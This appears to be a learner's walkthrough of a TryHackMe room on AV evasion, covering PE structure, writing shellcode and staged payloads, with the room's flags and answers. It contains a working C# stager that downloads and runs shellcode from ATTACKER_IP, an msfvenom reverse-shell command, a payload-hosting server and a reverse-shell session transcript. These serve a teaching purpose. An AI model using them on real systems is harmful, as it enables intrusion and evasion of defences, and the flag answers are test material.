---
Learn shellcode encoding, packing, binders, and crypters.
---


###  Introduction 



In this room, we'll explore how to build and deliver payloads, focusing on avoiding detection by common AV engines. We'll look at different techniques available to us as attackers and discuss the pros and cons of every one of them.

Objectives

    Learn how shellcodes are made.
    Explore the pros and cons of staged payloads.
    Create stealthy shellcodes to avoid AV detection.

Prerequisites

It is recommended to have some prior knowledge of how antivirus software works and a basic understanding of encryption and encoding. While not strictly required, some knowledge of basic assembly language can also be helpful. Also, we recommend having a basic understanding of reading code and understanding functions (C, C#).

### Challenge 

In this challenge, we prepared a Windows machine with a web application to let you upload your payloads. Once uploaded, the payloads will be checked by an AV and executed if found to be clean of malware. The main goal of this challenge is to evade Antivirus software installed on the VM and capture the flag in the file system. Feel free to try all of the techniques discussed throughout the room by uploading them to http://MACHINE_IP/.

Points to remember:

    Try to combine the techniques discussed in this room.
    The website supports EXE files only.
    Once the AV scans the uploaded file and no malicious code is detected, the file gets executed. Thus, if everything is put together correctly, then you should receive a reverse shell.

AV Challenge Web App

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/7a5c9d8d5501eaed9d0b677d94266414.png)

You can ignore the questions for this task for now, but be sure to come back to them once you have successfully bypassed the AV and gained a shell.

Deploy the attached VM to follow up with the content of the room before continuing to the next section! The VM will deploy in-browser and should appear automatically in the Split View. In case the VM is not visible, use the blue Show Split View button at the top-right of the page. If you prefer connecting via RDP, you can do so with the following credentials:
THM key
Username 	thm
Password 	Password321

You will also need the AttackBox for some tasks, so this is also a good moment to start it.

```
──(kali㉿kali)-[~/share]
└─$ ls
StagedPayload.exe
                                                                                           
┌──(kali㉿kali)-[~/share]
└─$ nc -lvp 7474              
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::7474
Ncat: Listening on 0.0.0.0:7474
ls
Ncat: Connection from 10.10.195.70.
Ncat: Connection from 10.10.195.70:50013.
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\App>ls
'ls' is not recognized as an internal or external command,
operable program or batch file.

C:\App>whoami
whoami
av-evasion-pc\av-victim

C:\App>cd ..
cd ..

C:\>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is A8A4-C362

 Directory of C:\

08/30/2022  11:36 PM    <DIR>          App
11/14/2018  06:56 AM    <DIR>          EFI
09/01/2022  12:24 AM    <DIR>          metasploit-framework
05/13/2020  05:58 PM    <DIR>          PerfLogs
08/31/2022  12:06 PM    <DIR>          Program Files
08/31/2022  12:05 PM    <DIR>          Program Files (x86)
08/30/2022  05:46 PM    <DIR>          Tools
08/30/2022  11:45 PM    <DIR>          Users
08/31/2022  02:03 PM    <DIR>          Windows
               0 File(s)              0 bytes
               9 Dir(s)   3,089,911,808 bytes free

C:\>cd Users
cd Users

C:\Users>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is A8A4-C362

 Directory of C:\Users

08/30/2022  11:45 PM    <DIR>          .
08/30/2022  11:45 PM    <DIR>          ..
08/31/2022  02:06 PM    <DIR>          Administrator
08/30/2022  11:45 PM    <DIR>          av-victim
12/12/2018  07:45 AM    <DIR>          Public
09/01/2022  12:32 AM    <DIR>          thm
               0 File(s)              0 bytes
               6 Dir(s)   3,089,911,808 bytes free

C:\Users>cd av-victim   
cd av-victim

C:\Users\av-victim>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is A8A4-C362

 Directory of C:\Users\av-victim

08/30/2022  11:45 PM    <DIR>          .
08/30/2022  11:45 PM    <DIR>          ..
08/31/2022  07:11 PM    <DIR>          Desktop
08/30/2022  11:45 PM    <DIR>          Documents
09/15/2018  07:19 AM    <DIR>          Downloads
09/15/2018  07:19 AM    <DIR>          Favorites
09/15/2018  07:19 AM    <DIR>          Links
09/15/2018  07:19 AM    <DIR>          Music
09/15/2018  07:19 AM    <DIR>          Pictures
09/15/2018  07:19 AM    <DIR>          Saved Games
09/15/2018  07:19 AM    <DIR>          Videos
               0 File(s)              0 bytes
              11 Dir(s)   3,089,911,808 bytes free

C:\Users\av-victim>cd Desktop
cd Desktop

C:\Users\av-victim\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is A8A4-C362

 Directory of C:\Users\av-victim\Desktop

08/31/2022  07:11 PM    <DIR>          .
08/31/2022  07:11 PM    <DIR>          ..
08/31/2022  07:12 PM                28 flag.txt
               1 File(s)             28 bytes
               2 Dir(s)   3,089,911,808 bytes free

C:\Users\av-victim\Desktop>more flag.txt
more flag.txt
THM{H3ll0-W1nD0ws-Def3nd3r!}

```


Which Antivirus software is running on the VM?
*Windows Defender*  (the flag hello windows defender :))
What is the name of the user account to which you have access?
*av-victim*


Establish a working shell on the victim machine and read the file on the user's desktop. What is the flag?
*THM{H3ll0-W1nD0ws-Def3nd3r!}*

### PE Structure 

This task highlights some of the high-level essential elements of PE data structure for Windows binaries.

What is PE?

Windows Executable file format, aka PE (Portable Executable), is a data structure that holds information necessary for files. It is a way to organize executable file code on a disk. Windows operating system components, such as Windows and DOS loaders, can load it into memory and execute it based on the parsed file information found in the PE.

In general, the default file structure of Windows binaries, such as EXE, DLL, and Object code files, has the same PE structure and works in the Windows operating system for both (x86 and x64) CPU architecture. 

A PE structure contains various sections that hold information about the binary, such as metadata and links to a memory address of external libraries. One of these sections is the PE Header, which contains metadata information, pointers, and links to address sections in memory. Another section is the Data section, which includes containers that include the information required for the Windows loader to run a program, such as the executable code, resources, links to libraries, data variables, etc. 

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/ad61ff4aa1d4f649c02348dfa32eb613.png)

There are different types of data containers in the PE structure, each holding different data.

    .text stores the actual code of the program
    .data holds the initialized and defined variables
    .bss holds the uninitialized data (declared variables with no assigned values)
    .rdata contains the read-only data
    .edata: contains exportable objects and related table information
    .idata imported objects and related table information
    .reloc image relocation information
    .rsrc links external resources used by the program such as images, icons, embedded binaries, and manifest file, which has all information about program versions, authors, company, and copyright!

The PE structure is a vast and complicated topic, and we are not going to go into too much detail regarding the headers and data sections. This task provides a high-level overview of the PE structure. If you are interested in gaining more information on the topic, we suggest checking the following THM rooms where the topic is explained in greater detail:

    Windows Internals
    Dissecting PE Headers

You can also get more in-depth details about PE if you check the Windows PE format's Docs [website](https://docs.microsoft.com/en-us/windows/win32/debug/pe-format). 

When looking at the PE contents, we'll see it contains a bunch of bytes that aren't human-readable. However, it includes all the details the loader needs to run the file. The following are the example steps in which the Windows loader reads an executable binary and runs it as a process. 

    Header sections: DOS, Windows, and optional headers are parsed to provide information about the EXE file. For example,
        The magic number starts with "MZ," which tells the loader that this is an EXE file.
        File Signatures
        Whether the file is compiled for x86 or x64 CPU architecture.
        Creation timestamp. 
    Parsing the section table details, such as 
        Number of Sections the file contains.
    Mapping the file contents into memory based on
        The EntryPoint address and the offset of the ImageBase. 
        RVA: Relative Virtual Address, Addresses related to Imagebase.
    Imports, DLLs, and other objects are loaded into the memory.
    The EntryPoint address is located and the main execution function runs.

Why do we need to know about PE?

There are a couple of reasons why we need to learn about it. First, since we are dealing with packing and unpacking topics, the technique requires details about the PE structure. 

The other reason is that AV software and malware analysts analyze EXE files based on the information in the PE Header and other PE sections. Thus, to create or modify malware with AV evasion capability targeting a Windows machine, we need to understand the structure of Windows Portable Executable files and where the malicious shellcode can be stored.

We can control in which Data section to store our shellcode by how we define and initialize the shellcode variable. The following are some examples that show how we can store the shellcode in PE:

    Defining the shellcode as a local variable within the main function will store it in the .TEXT PE section.
    Defining the shellcode as a global variable will store it in the .Data section.
    Another technique involves storing the shellcode as a raw binary in an icon image and linking it within the code, so in this case, it shows up in the .rsrc Data section. 
    We can add a custom data section to store the shellcode.

PE-Bear

The attached VM is a Windows development machine that has the tools needed to parse EXE files and read the details we discussed. For your convenience, we have provided a copy of the PE-Bear software on the Desktop, which helps to check the PE structure: Headers, Sections, etc. PE-Bear provides a graphic user interface to show all relevant EXE details. To load an EXE file for analysis, select File -> Load PEs (Ctrl + O).

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/c51856efd63b36680857498bac814469.png)


Once a file is loaded, we can see all PE details. The following screenshot shows PE details of the loaded file, including the headers and sections we discussed earlier in this task.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/78dca06d1d1e4249f25734af8082b8be.png)

	Now it is time to try it out! Load the thm-intro2PE.exe file to answer the questions below. The file is located in the following location: c:\Tools\PE files\thm-intro2PE.exe.



What is the last 6 digits of the MD5 hash value of the thm-intro2PE.exe file? 
Check the General tab and look for the MD5 value
![[Pasted image 20220915235516.png]]
*530949*



What is the Magic number value of the thm-intro2PE.exe file (in Hex)?
![[Pasted image 20220915235702.png]]
*5A4D*

What is the Entry Point value of the thm-intro2PE.exe file?
Check the Optional Header tab and look for the Entry Point value.
![[Pasted image 20220915235816.png]]

*12E4*



How many Sections does the thm-intro2PE.exe file have?
Check the File Header section (Section Count) or count them manually.

![[Pasted image 20220916000021.png]]

*7*
A custom section could be used to store extra data. Malware developers use this technique to create a new section that contains their malicious code and hijack the flow of the program to jump and execute the content of the new section. What is the name of the extra section? 

![[Pasted image 20220916000052.png]]

*.flag*


Check the content of the extra section. What is the flag?
Select the Raw Address or Virtual Address value.

![[Pasted image 20220916001137.png]]

*THM{PE-N3w-s3ction!}*

###  Introduction to Shellcode 

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/7d8572294a70c545705aecc6c2453a3e.png)

 Shellcode is a set of crafted machine code instructions that tell the vulnerable program to run additional functions and, in most cases, provide access to a system shell or create a reverse command shell.

Once the shellcode is injected into a process and executed by the vulnerable software or program, it modifies the code run flow to update registers and functions of the program to execute the attacker's code.

It is generally written in Assembly language and translated into hexadecimal opcodes (operational codes). Writing unique and custom shellcode helps in evading AV software significantly. But writing a custom shellcode requires excellent knowledge and skill in dealing with Assembly language, which is not an easy task! 

A Simple Shellcode!

In order to craft your own shellcode, a set of skills is required:

    A decent understanding of x86 and x64 CPU architectures.
    Assembly language.
    Strong knowledge of programming languages such as C.
    Familiarity with the Linux and Windows operating systems.

To generate our own shellcode, we need to write and extract bytes from the assembler machine code. For this task, we will be using the AttackBox to create a simple shellcode for Linux that writes the string "THM, Rocks!". The following assembly code uses two main functions:

    System Write function (sys_write) to print out a string we choose.
    System Exit function (sys_exit) to terminate the execution of the program.

To call those functions, we will use syscalls. A syscall is the way in which a program requests the kernel to do something. In this case, we will request the kernel to write a string to our screen, and the exit the program. Each operating system has a different calling convention regarding syscalls, meaning that to use the write in Linux, you'll probably use a different syscall than the one you'd use on Windows. For 64-bits Linux, you can call the needed functions from the kernel by setting up the following values:
rax	System Call	rdi	rsi	rdx
0x1	sys_write	unsigned int fd	const char *buf	size_t count
0x3c	sys_exit	int error_code	
	
The table above tells us what values we need to set in different processor registers to call the sys_write and sys_exit functions using syscalls. For 64-bits Linux, the rax register is used to indicate the function in the kernel we wish to call. Setting rax to 0x1 makes the kernel execute sys_write, and setting rax to 0x3c will make the kernel execute sys_exit. Each of the two functions require some parameters to work, which can be set through the rdi, rsi and rdx registers. You can find a complete reference of available 64-bits Linux syscalls [here](https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/).

For sys_write, the first parameter sent through rdi is the file descriptor to write to. The second parameter in rsi is a pointer to the string we want to print, and the third in rdx is the size of the string to print.

For sys_exit, rdi needs to be set to the exit code for the program. We will use the code 0, which means the program exited successfully.

Copy the following code to your AttackBox in a file called thm.asm: 

```
global _start

section .text
_start:
    jmp MESSAGE      ; 1) let's jump to MESSAGE

GOBACK:
    mov rax, 0x1
    mov rdi, 0x1
    pop rsi          ; 3) we are popping into `rsi`; now we have the
                     ; address of "THM, Rocks!\r\n"
    mov rdx, 0xd
    syscall

    mov rax, 0x3c
    mov rdi, 0x0
    syscall

MESSAGE:
    call GOBACK       ; 2) we are going back, since we used `call`, that means
                      ; the return address, which is, in this case, the address
                      ; of "THM, Rocks!\r\n", is pushed into the stack.
    db "THM, Rocks!", 0dh, 0ah

```

Let's explain the ASM code a bit more. First, our message string is stored at the end of the .text section. Since we need a pointer to that message to print it, we will jump to the call instruction before the message itself. When call GOBACK is executed, the address of the next instruction after call will be pushed into the stack, which corresponds to where our message is. Note that the 0dh, 0ah at the end of the message is the binary equivalent to a new line (\r\n).

Next, the program starts the GOBACK routine and prepares the required registers for our first sys_write() function.

    We specify the sys_write function by storing 1 in the rax register.
    We set rdi to 1 to print out the string to the user's console (STDOUT).
    We pop a pointer to our string, which was pushed when we called GOBACK and store it into rsi.
    With the syscall instruction, we execute the sys_write function with the values we prepared.
    For the next part, we do the same to call the sys_exit function, so we set 0x3c into the rax register and call the syscall function to exit the program.

Next, we compile and link the ASM code to create an x64 Linux executable file and finally execute the program.

```

Assembler and link our code

           
user@AttackBox$ nasm -f elf64 thm.asm
user@AttackBox$ ld thm.o -o thm
user@AttackBox$ ./thm
THM,Rocks!

        


```

```
┌──(kali㉿kali)-[~]
└─$ mkdir asm      
                                                                                           
┌──(kali㉿kali)-[~]
└─$ cd asm       
                                                                                           
┌──(kali㉿kali)-[~/asm]
└─$ nano thm.asm              
                                                                                           
┌──(kali㉿kali)-[~/asm]
└─$ nasm -f elf64 thm.asm 
                                                                                           
┌──(kali㉿kali)-[~/asm]
└─$ ld thm.o -o thm
                                                                                           
┌──(kali㉿kali)-[~/asm]
└─$ ls             
thm  thm.asm  thm.o
                                                                                           
┌──(kali㉿kali)-[~/asm]
└─$ ./thm                                           
THM, Rocks!

```

We used the nasm command to compile the asm file, specifying the -f elf64 option to indicate we are compiling for 64-bits Linux. Notice that as a result we obtain a .o file, which contains object code, which needs to be linked in order to be a working executable file. The ld command is used to link the object and obtain the final executable. The -o option is used to specify the name of the output executable file.

Now that we have the compiled ASM program, let's extract the shellcode with the objdump command by dumping the .text section of the compiled binary.

```

Dump the .text section

           
user@AttackBox$ objdump -d thm

thm:     file format elf64-x86-64


Disassembly of section .text:

0000000000400080 <_start>:
  400080:	eb 1e                	jmp    4000a0 

0000000000400082 :
  400082:	b8 01 00 00 00       	mov    $0x1,%eax
  400087:	bf 01 00 00 00       	mov    $0x1,%edi
  40008c:	5e                   	pop    %rsi
  40008d:	ba 0d 00 00 00       	mov    $0xd,%edx
  400092:	0f 05                	syscall 
  400094:	b8 3c 00 00 00       	mov    $0x3c,%eax
  400099:	bf 00 00 00 00       	mov    $0x0,%edi
  40009e:	0f 05                	syscall 

00000000004000a0 :
  4000a0:	e8 dd ff ff ff       	callq  400082 
  4000a5:	54                   	push   %rsp
  4000a6:	48                   	rex.W
  4000a7:	4d 2c 20             	rex.WRB sub $0x20,%al
  4000aa:	52                   	push   %rdx
  4000ab:	6f                   	outsl  %ds:(%rsi),(%dx)
  4000ac:	63 6b 73             	movslq 0x73(%rbx),%ebp
  4000af:	21                   	.byte 0x21
  4000b0:	0d                   	.byte 0xd
  4000b1:	0a                   	.byte 0xa

        




```

Now we need to extract the hex value from the above output. To do that, we can use objcopy to dump the .text section into a new file called thm.text in a binary format as follows:

```

Extract the .text section

           
user@AttackBox$ objcopy -j .text -O binary thm thm.text


```


The thm.text contains our shellcode in binary format, so to be able to use it, we will need to convert it to hex first. The xxd command has the -i option that will output the binary file in a C string directly:

```

Output the hex equivalent to our shellcode

           
user@AttackBox$ xxd -i thm.text
unsigned char new_text[] = {
  0xeb, 0x1e, 0xb8, 0x01, 0x00, 0x00, 0x00, 0xbf, 0x01, 0x00, 0x00, 0x00,
  0x5e, 0xba, 0x0d, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xb8, 0x3c, 0x00, 0x00,
  0x00, 0xbf, 0x00, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xe8, 0xdd, 0xff, 0xff,
  0xff, 0x54, 0x48, 0x4d, 0x2c, 0x20, 0x52, 0x6f, 0x63, 0x6b, 0x73, 0x21,
  0x0d, 0x0a
};
unsigned int new_text_len = 50;

```

Finally, we have it, a formatted shellcode from our ASM assembly. That was fun! As we see, dedication and skills are required to generate shellcode for your work!

To confirm that the extracted shellcode works as we expected, we can execute our shellcode and inject it into a C program.

```
#include <stdio.h>

int main(int argc, char **argv) {
    unsigned char message[] = {
        0xeb, 0x1e, 0xb8, 0x01, 0x00, 0x00, 0x00, 0xbf, 0x01, 0x00, 0x00, 0x00,
        0x5e, 0xba, 0x0d, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xb8, 0x3c, 0x00, 0x00,
        0x00, 0xbf, 0x00, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xe8, 0xdd, 0xff, 0xff,
        0xff, 0x54, 0x48, 0x4d, 0x2c, 0x20, 0x52, 0x6f, 0x63, 0x6b, 0x73, 0x21,
        0x0d, 0x0a
    };
    
    (*(void(*)())message)();
    return 0;
}

```

Then, we compile and execute it as follows,

```
           
user@AttackBox$ gcc -g -Wall -z execstack thm.c -o thmx
user@AttackBox$ ./thmx
THM,Rocks!

```

Nice! it works. Note that we compile the C program by disabling the NX protection, which may prevent us from executing the code correctly in the data segment or stack.

Understanding shellcodes and how they are created is essential for the following tasks, especially when dealing with encrypting and encoding the shellcode.



Modify your C program to execute the following shellcode. What is the flag?

```
unsigned char message[] = {
  0xeb, 0x34, 0xb9, 0x00, 0x00, 0x00, 0x00, 0x5e, 0x48, 0x89, 0xf0, 0x80,
  0x34, 0x08, 0x01, 0x48, 0x83, 0xc1, 0x01, 0x48, 0x83, 0xf9, 0x19, 0x75,
  0xf2, 0xb8, 0x01, 0x00, 0x00, 0x00, 0xbf, 0x01, 0x00, 0x00, 0x00, 0xba,
  0x19, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xb8, 0x3c, 0x00, 0x00, 0x00, 0xbf,
  0x00, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xe8, 0xc7, 0xff, 0xff, 0xff, 0x55,
  0x49, 0x4c, 0x7a, 0x78, 0x31, 0x74, 0x73, 0x2c, 0x30, 0x72, 0x36, 0x2c,
  0x34, 0x69, 0x32, 0x30, 0x30, 0x62, 0x31, 0x65, 0x32, 0x7c, 0x0d, 0x0a
};

```

Inject the shellcode into a C program and compile it using the gcc command.

```
┌──(kali㉿kali)-[~/asm]
└─$ cat flag.c      
#include <stdio.h>

int main(int argc, char **argv) {
    unsigned char message[] = {
  0xeb, 0x34, 0xb9, 0x00, 0x00, 0x00, 0x00, 0x5e, 0x48, 0x89, 0xf0, 0x80,
  0x34, 0x08, 0x01, 0x48, 0x83, 0xc1, 0x01, 0x48, 0x83, 0xf9, 0x19, 0x75,
  0xf2, 0xb8, 0x01, 0x00, 0x00, 0x00, 0xbf, 0x01, 0x00, 0x00, 0x00, 0xba,
  0x19, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xb8, 0x3c, 0x00, 0x00, 0x00, 0xbf,
  0x00, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xe8, 0xc7, 0xff, 0xff, 0xff, 0x55,
  0x49, 0x4c, 0x7a, 0x78, 0x31, 0x74, 0x73, 0x2c, 0x30, 0x72, 0x36, 0x2c,
  0x34, 0x69, 0x32, 0x30, 0x30, 0x62, 0x31, 0x65, 0x32, 0x7c, 0x0d, 0x0a
    };
    
    (*(void(*)())message)();
    return 0;
}
                                                                                           
┌──(kali㉿kali)-[~/asm]
└─$ gcc -g -Wall -z execstack flag.c -o flagx
                                                                                           
┌──(kali㉿kali)-[~/asm]
└─$ ./flagx
THM{y0ur-1s7-5h311c0d3}

```

*THM{y0ur-1s7-5h311c0d3}*

### Staged Payloads 

In our goal to bypass the AV, we will find two main approaches to delivering the final shellcode to a victim. Depending on the method, you will find payloads are usually categorized as staged or stageless payloads. In this task, we will look at the differences in both approaches and the advantages of each method.

Stageless Payloads

A stageless payload embeds the final shellcode directly into itself. Think of it as a packaged app that executes the shellcode in a single-step process. In previous tasks, we embedded an executable that embedded a simple calc shellcode, making a stageless payload.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/cad28e045fd6fec615b04d731aef7f9a.png)

In the example above, when the user executes the malicious payload, the embedded shellcode will run, providing a reverse shell to the attacker.

Staged Payloads

Staged payloads work by using intermediary shellcodes that act as steps leading to the execution of a final shellcode. Each of these intermediary shellcodes is known as a stager, and its primary goal is to provide a means to retrieve the final shellcode and execute it eventually.

While there might be payloads with several stages, the usual case involves having a two-stage payload where the first stage, which we'll call stage0, is a stub shellcode that will connect back to the attacker's machine to download the final shellcode to be executed.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/f92f294a9e599967a0961b4273381be6.png)

Once retrieved, the stage0 stub will inject the final shellcode somewhere in the memory of the payload's process and execute it (as shown below).

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/fd8a98b3cb79cca98a1e0dfd0292ea61.png)

Staged vs. Stageless

When deciding which type of payload to use, we must be aware of the environment we'll be attacking. Each payload type has advantages and disadvantages depending on the specific attack scenario.

In the case of stageless payloads, you will find the following advantages:

    The resulting executable packs all that is needed to get our shellcode working.
    The payload will execute without requiring additional network connections. The fewer the network interactions, the lesser your chances of being detected by an IPS.
    If you are attacking a host with very restricted network connectivity, you may want your whole payload to be in a single package.

For staged payloads, you will have:

    Small footprint on disk. Since stage0 is only in charge of downloading the final shellcode, it will most likely be small in size.
    The final shellcode isn't embedded into the executable. If your payload is captured, the Blue Team will only have access to the stage0 stub and nothing more.
    The final shellcode is loaded in memory and never touches the disk. This makes it less prone to be detected by AV solutions.
    You can reuse the same stage0 dropper for many shellcodes, as you can simply replace the final shellcode that gets served to the victim machine.

In conclusion, we can't say that either type is better than the other unless we add some context to it. In general, stageless payloads are better suited for networks with lots of perimeter security, as it doesn't rely on having to download the final shellcode from the Internet. If, for example, you are performing a USB Drop Attack to target computers in a closed network environment where you know you won't get a connection back to your machine, stageless is the way to go.

Staged payloads, on the other hand, are great when you want your footprint on the local machine to be reduced to a minimum. Since they execute the final payload in memory, some AV solutions might find it harder to detect them. They are also great for avoiding exposing your shellcodes (which usually take considerable time to prepare), as the shellcode isn't dropped into the victim's disk at any point (as an artifact).

Stagers in Metasploit

When creating payloads with msfvenom or using them directly in Metasploit, you can choose to use either staged or stageless payloads. As an example, if you want to generate a reverse TCP shell, you will find two payloads exist for that purpose with slightly different names (notice the _ versus / after shell):
Payload	Type
windows/x64/shell_reverse_tcp
	Stageless payload
windows/x64/shell/reverse_tcp
	Staged payload

You will generally find that the same name patterns are applied to other types of shells. To use a stageless Meterpreter, for example, we would use the windows/x64/meterpreter_reverse_tcp, rather than windows/x64/meterpreter/reverse_tcp, which works as its staged counterpart.

Creating Your Own Stager

	To create a staged payload, we will use a slightly modified version of the stager code provided by [@mvelazc0](https://github.com/mvelazc0/defcon27_csharp_workshop/blob/master/Labs/lab2/2.cs). The full code of our stager can be obtained here, but is also available in your Windows machine at C:\Tools\CS Files\StagedPayload.cs:

The code may look intimidating at first but is relatively straightforward. Let's analyze what it does step by step.

```
using System;
using System.Net;
using System.Text;
using System.Configuration.Install;
using System.Runtime.InteropServices;
using System.Security.Cryptography.X509Certificates;

public class Program {
  //https://docs.microsoft.com/en-us/windows/desktop/api/memoryapi/nf-memoryapi-virtualalloc 
  [DllImport("kernel32")]
  private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);

  //https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-createthread
  [DllImport("kernel32")]
  private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);

  //https://docs.microsoft.com/en-us/windows/desktop/api/synchapi/nf-synchapi-waitforsingleobject
  [DllImport("kernel32")]
  private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

  private static UInt32 MEM_COMMIT = 0x1000;
  private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;

  public static void Main()
  {
    string url = "https://ATTACKER_IP/shellcode.bin";
    Stager(url);
  }

  public static void Stager(string url)
  {

    WebClient wc = new WebClient();
    ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
    ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;

    byte[] shellcode = wc.DownloadData(url);

    UInt32 codeAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    Marshal.Copy(shellcode, 0, (IntPtr)(codeAddr), shellcode.Length);

    IntPtr threadHandle = IntPtr.Zero;
    UInt32 threadId = 0;
    IntPtr parameter = IntPtr.Zero;
    threadHandle = CreateThread(0, 0, codeAddr, parameter, 0, ref threadId);

    WaitForSingleObject(threadHandle, 0xFFFFFFFF);

  }
}
```


The first part of the code will import some Windows API functions via P/Invoke. The functions we need are the following three from kernel32.dll:

WinAPI Function	Description
[VirtualAlloc()](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc)	Allows us to reserve some memory to be used by our shellcode.
[CreateThread()](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread)	Creates a thread as part of the current process.
[WaitForSingleObject()](https://docs.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitforsingleobject)	Used for thread synchronization. It allows us to wait for a thread to finish before continuing.

The part of the code in charge of importing these functions is the following:

```
//https://docs.microsoft.com/en-us/windows/desktop/api/memoryapi/nf-memoryapi-virtualalloc 
[DllImport("kernel32")]
private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);

//https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-createthread
[DllImport("kernel32")]
private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);

//https://docs.microsoft.com/en-us/windows/desktop/api/synchapi/nf-synchapi-waitforsingleobject
[DllImport("kernel32")]
private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
```

The most significant part of our code will be in the Stager() function, where the stager logic will be implemented. The Stager function will receive a URL from where the shellcode to be executed will be downloaded.

The first part of the Stager() function will create a new WebClient() object that allows us to download the shellcode using web requests. Before making the actual request, we will overwrite the ServerCertificateValidationCallback method in charge of validating SSL certificates when using HTTPS requests so that the WebClient doesn't complain about self-signed or invalid certificates, which we will be using in the web server hosting the payloads. After that, we will call the DownloadData() method to download the shellcode from the given URL and store it into the shellcode variable:

```
WebClient wc = new WebClient();
ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;

byte[] shellcode = wc.DownloadData(url);
```

Once our shellcode is downloaded and available in the shellcode variable, we'll need to copy it into executable memory before actually running it. We use VirtualAlloc() to request a memory block from the operating system. Notice that we request enough memory to allocate shellcode.Length bytes, and set the PAGE_EXECUTE_READWRITE flag, making the assigned memory executable, readable and writable. Once our executable memory block is reserved and assigned to the codeAddr variable, we use Marshal.Copy() to copy the contents of the shellcode variable in the codeAddr variable.

```
UInt32 codeAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
Marshal.Copy(shellcode, 0, (IntPtr)(codeAddr), shellcode.Length);

```

Now that we have a copy of the shellcode allocated in a block of executable memory, we use the CreateThread() function to spawn a new thread on the current process that will execute our shellcode. The third parameter passed to CreateThread points to codeAddr, where our shellcode is stored, so that when the thread starts, it runs the contents of our shellcode as if it were a regular function. The fifth parameter is set to 0, meaning the thread will start immediately.

Once the thread has been created, we will call the WaitForSingleObject() function to instruct our current program that it has to wait for the thread execution to finish before continuing. This prevents our program from closing before the shellcode thread gets a chance to execute:

```
IntPtr threadHandle = IntPtr.Zero;
UInt32 threadId = 0;
IntPtr parameter = IntPtr.Zero;
threadHandle = CreateThread(0, 0, codeAddr, parameter, 0, ref threadId);

WaitForSingleObject(threadHandle, 0xFFFFFFFF);
```

To compile the code, we suggest copying it into a Windows machine as a file called staged-payload.cs and compiling it with the following command:

```

PowerShell

PS C:\> csc staged-payload.cs

```

Using our stager to run a reverse shell

Once our payload is compiled, we will need to set up a web server to host the final shellcode. Remember that our stager will connect to this server to retrieve the shellcode and execute it in the victim machine in-memory. Let's start by generating a shellcode (the name of the file needs to match the URL in our stager):

```

AttackBox

user@AttackBox$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=7474 -f raw -o shellcode.bin -b '\x00\x0a\x0d'

```

Notice that we are using the raw format for our shellcode, as the stager will directly load whatever it downloads into memory.

Now that we have a shellcode, let's set up a simple HTTPS server. First, we will need to create a self-signed certificate with the following command:

```

AttackBox

user@AttackBox$ openssl req -new -x509 -keyout localhost.pem -out localhost.pem -days 365 -nodes


```

You will be asked for some information, but feel free to press enter for any requested information, as we don't need the SSL certificate to be valid. Once we have an SSL certificate, we can spawn a simple HTTPS server using python3 with the following command:

```

AttackBox

user@AttackBox$ python3 -c "import http.server, ssl;server_address=('0.0.0.0',443);httpd=http.server.HTTPServer(server_address,http.server.SimpleHTTPRequestHandler);httpd.socket=ssl.wrap_socket(httpd.socket,server_side=True,certfile='localhost.pem',ssl_version=ssl.PROTOCOL_TLSv1_2);httpd.serve_forever()"


```

